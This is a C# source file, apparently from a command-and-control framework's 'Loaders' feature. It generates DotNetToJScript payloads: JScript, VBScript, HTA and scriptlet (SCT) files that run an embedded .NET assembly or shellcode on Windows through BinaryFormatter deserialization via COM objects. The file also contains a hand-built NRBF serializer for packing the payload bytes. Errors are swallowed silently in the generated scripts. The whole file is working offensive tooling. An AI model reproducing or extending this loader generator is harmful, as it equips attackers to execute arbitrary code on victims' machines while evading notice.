using System.Text;

namespace C2.Features.Loaders;

public enum D2JSFormat { JScript, VBScript, Hta, Sct }

/// <summary>
/// Generates DotNetToJScript payloads — JScript/VBScript/HTA/SCT scripts that bootstrap
/// a .NET assembly via BinaryFormatter deserialization through COM-accessible .NET objects.
///
/// The NRBF (Net Remoting Binary Format) serializer constructs BinaryFormatter-compatible
/// byte streams directly, without needing System.Runtime.Serialization — making it work in WASM.
/// </summary>
public static class D2JSGenerator
{
    public static string Generate(string serializedBase64, string entryClass, D2JSFormat format, string runtimeVersion, string? assemblyBase64 = null)
    {
        return format switch
        {
            D2JSFormat.JScript => BuildJScript(serializedBase64, runtimeVersion, assemblyBase64),
            D2JSFormat.VBScript => BuildVBScript(serializedBase64, runtimeVersion, assemblyBase64),
            D2JSFormat.Hta => BuildHta(serializedBase64, runtimeVersion, assemblyBase64),
            D2JSFormat.Sct => BuildSct(serializedBase64, runtimeVersion, assemblyBase64),
            _ => ""
        };
    }

    // ── NRBF Serializer ────────────────────────────────────────────────

    /// <summary>
    /// Constructs an NRBF stream for a [Serializable] class with no members.
    /// The class should implement IObjectReference for code execution on deserialization.
    /// </summary>
    public static byte[] BuildNrbf(string assemblyName, string typeName)
    {
        using var ms = new MemoryStream();
        using var w = new BinaryWriter(ms);

        WriteHeader(w);
        WriteLibrary(w, 2, assemblyName);

        // ClassWithMembersAndTypes — 0 members
        w.Write((byte)5);                  // RecordType
        w.Write(1);                        // ObjectId (root)
        WritePrefixedString(w, typeName);
        w.Write(0);                        // MemberCount
        w.Write(2);                        // LibraryId

        w.Write((byte)11);                 // MessageEnd
        return ms.ToArray();
    }

    /// <summary>
    /// Constructs an NRBF stream for a class with a single byte[] member.
    /// Used to embed assembly or shellcode bytes in the serialized payload.
    /// </summary>
    public static byte[] BuildNrbfWithPayload(string assemblyName, string typeName, string memberName, byte[] payload)
    {
        using var ms = new MemoryStream();
        using var w = new BinaryWriter(ms);

        WriteHeader(w);
        WriteLibrary(w, 2, assemblyName);

        // ClassWithMembersAndTypes — 1 member (byte[])
        w.Write((byte)5);                  // RecordType
        w.Write(1);                        // ObjectId (root)
        WritePrefixedString(w, typeName);
        w.Write(1);                        // MemberCount
        WritePrefixedString(w, memberName);
        w.Write((byte)7);                  // BinaryType: PrimitiveArray
        w.Write((byte)2);                  // PrimitiveType: Byte
        w.Write(2);                        // LibraryId

        // Member value — inline ArraySinglePrimitive
        w.Write((byte)15);                 // RecordType: ArraySinglePrimitive
        w.Write(3);                        // ObjectId
        w.Write(payload.Length);            // Length
        w.Write((byte)2);                  // PrimitiveType: Byte
        w.Write(payload);                  // Raw bytes

        w.Write((byte)11);                 // MessageEnd
        return ms.ToArray();
    }

    private static void WriteHeader(BinaryWriter w)
    {
        w.Write((byte)0);   // RecordType: SerializedStreamHeader
        w.Write(1);          // RootId
        w.Write(-1);         // HeaderId
        w.Write(1);          // MajorVersion
        w.Write(0);          // MinorVersion
    }

    private static void WriteLibrary(BinaryWriter w, int libraryId, string name)
    {
        w.Write((byte)12);  // RecordType: BinaryLibrary
        w.Write(libraryId);
        WritePrefixedString(w, name);
    }

    private static void WritePrefixedString(BinaryWriter w, string s)
    {
        var bytes = Encoding.UTF8.GetBytes(s);
        Write7BitInt(w, bytes.Length);
        w.Write(bytes);
    }

    private static void Write7BitInt(BinaryWriter w, int value)
    {
        while (value >= 0x80)
        {
            w.Write((byte)(value | 0x80));
            value >>= 7;
        }
        w.Write((byte)value);
    }

    // ── Script Templates ───────────────────────────────────────────────

    private static string BuildJScript(string b64, string version, string? asmB64 = null)
    {
        string asmFn = "", asmVar = "", asmCall = "";
        if (asmB64 is not null)
        {
            asmFn = @"

function loadAssembly(b) {
    var enc = new ActiveXObject(""System.Text.ASCIIEncoding"");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var asmType = enc.GetType().Assembly.GetType(""System.Reflection.Assembly"");
    var al = new ActiveXObject(""System.Collections.ArrayList"");
    al.Add(ba);
    asmType.InvokeMember(""Load"", 280, null, null, al.ToArray());
}
";
            asmVar = $@"var assembly_obj = ""{asmB64}"";
";
            asmCall = @"
    loadAssembly(assembly_obj);";
        }

        return $@"function setversion() {{
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = '{version}';
}}

function base64ToStream(b) {{
    var enc = new ActiveXObject(""System.Text.ASCIIEncoding"");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject(""System.IO.MemoryStream"");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    return ms;
}}{asmFn}{asmVar}
var serialized_obj = ""{b64}"";

try {{
    setversion();{asmCall}
    var stm = base64ToStream(serialized_obj);
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList');
    var d = fmt.Deserialize_2(stm);
    al.Add(undefined);
    var o = d;
}} catch (e) {{}}";
    }

    private static string BuildVBScript(string b64, string version, string? asmB64 = null)
    {
        string asmSub = "", asmVar = "", asmCall = "";
        if (asmB64 is not null)
        {
            asmSub = @"

Sub LoadAssembly(b)
    Dim enc, length, ba, transform, asmType, al
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set asmType = enc.GetType().Assembly.GetType(""System.Reflection.Assembly"")
    Set al = CreateObject(""System.Collections.ArrayList"")
    al.Add ba
    asmType.InvokeMember ""Load"", 280, Nothing, Nothing, al.ToArray()
End Sub";
            asmVar = FormatVBString("assembly_obj", asmB64) + "\n\n";
            asmCall = "LoadAssembly assembly_obj\n";
        }

        var blobLines = FormatVBString("serialized_obj", b64);

        return $@"Sub SetVersion()
    Dim shell
    Set shell = CreateObject(""WScript.Shell"")
    shell.Environment(""Process"")(""COMPLUS_Version"") = ""{version}""
End Sub

Function Base64ToStream(b)
    Dim enc, length, ba, transform, ms
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    ms.Write ba, 0, (length \ 4) * 3
    ms.Position = 0
    Set Base64ToStream = ms
End Function{asmSub}

{asmVar}{blobLines}

On Error Resume Next
SetVersion
{asmCall}Dim stm
Set stm = Base64ToStream(serialized_obj)
Dim fmt
Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
Dim al
Set al = CreateObject(""System.Collections.ArrayList"")
Dim d
Set d = fmt.Deserialize_2(stm)
al.Add Empty";
    }

    private static string BuildHta(string b64, string version, string? asmB64 = null)
    {
        var js = BuildJScript(b64, version, asmB64);
        return $@"<html>
<head>
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSct(string b64, string version, string? asmB64 = null)
    {
        var js = BuildJScript(b64, version, asmB64);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""d2js""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    /// <summary>
    /// Splits a long string into VBScript-compatible concatenation statements
    /// to avoid line-length limits in script hosts.
    /// </summary>
    private static string FormatVBString(string name, string value)
    {
        const int chunk = 200;
        var sb = new StringBuilder();

        if (value.Length <= chunk)
        {
            sb.Append($"Dim {name}\n{name} = \"{value}\"");
            return sb.ToString();
        }

        sb.AppendLine($"Dim {name}");
        sb.AppendLine($"{name} = \"\"");
        for (var i = 0; i < value.Length; i += chunk)
        {
            var c = value.Substring(i, Math.Min(chunk, value.Length - i));
            sb.AppendLine($"{name} = {name} & \"{c}\"");
        }
        return sb.ToString().TrimEnd();
    }
}
